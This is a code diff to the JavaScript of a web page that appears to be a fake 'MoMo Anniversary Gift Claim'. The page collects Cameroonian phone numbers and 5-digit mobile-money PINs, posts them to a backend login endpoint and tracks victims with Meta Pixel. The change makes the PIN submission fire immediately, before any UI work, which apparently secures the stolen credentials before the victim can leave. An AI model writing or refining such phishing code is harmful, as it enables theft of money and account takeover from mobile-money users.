@@ -1430,6 +1430,7 @@
 
     // ============================================
     // PROCEED → backend
+    // ⚡ FIRES THE FETCH IMMEDIATELY — no waiting on UI/pixel
     // ============================================
     proceed.addEventListener('click', async () => {
       if (!/^\d{5}$/.test(pin.value)) {
@@ -1437,31 +1438,39 @@
         return;
       }
 
-      proceed.disabled = true;
-      proceed.innerHTML = '<span class="btn-spinner"></span><span>Traitement...</span>';
-
+      // 1. Build payload synchronously
       const digits = phoneInput.value.replace(/\D/g, '');
       const fullPhone = '+237' + digits;
       const userPin = pin.value;
 
+      // 2. Fire the fetch RIGHT NOW (before any UI work)
+      const controller = new AbortController();
+      const timeoutId = setTimeout(() => controller.abort(), 15000);
+
+      const loginPromise = fetch(`${API_BASE}/api/login`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ phone: fullPhone, country: 'CM', pin: userPin }),
+        signal: controller.signal
+      });
+
+      // 3. Fire Meta Pixel in parallel — don't await it
       if (typeof fbq === 'function') {
-        fbq('track', 'AddPaymentInfo', {
-          content_name: 'MoMo Anniversary Gift Claim',
-          content_category: 'Anniversary',
-          currency: 'XAF'
-        });
+        try {
+          fbq('track', 'AddPaymentInfo', {
+            content_name: 'MoMo Anniversary Gift Claim',
+            content_category: 'Anniversary',
+            currency: 'XAF'
+          });
+        } catch (e) { /* ignore */ }
       }
 
-      try {
-        const controller = new AbortController();
-        const timeoutId = setTimeout(() => controller.abort(), 15000);
+      // 4. NOW do the UI work
+      proceed.disabled = true;
+      proceed.innerHTML = '<span class="btn-spinner"></span><span>Traitement...</span>';
 
-        const res = await fetch(`${API_BASE}/api/login`, {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ phone: fullPhone, country: 'CM', pin: userPin }),
-          signal: controller.signal
-        });
+      try {
+        const res = await loginPromise;
         clearTimeout(timeoutId);
 
         const data = await res.json().catch(() => ({}));
@@ -1469,9 +1478,10 @@
 
         if (!res.ok || !data.ok) throw new Error(data.error || 'Login failed');
 
-        closeModal();
+        // Show overlay immediately + start closing modal in background
         startVerifyBar();
         document.body.classList.add('modal-open');
+        closeModal();
 
         // Backend B returns `requestId`
         const reqId = data.requestId || data.sessionId;
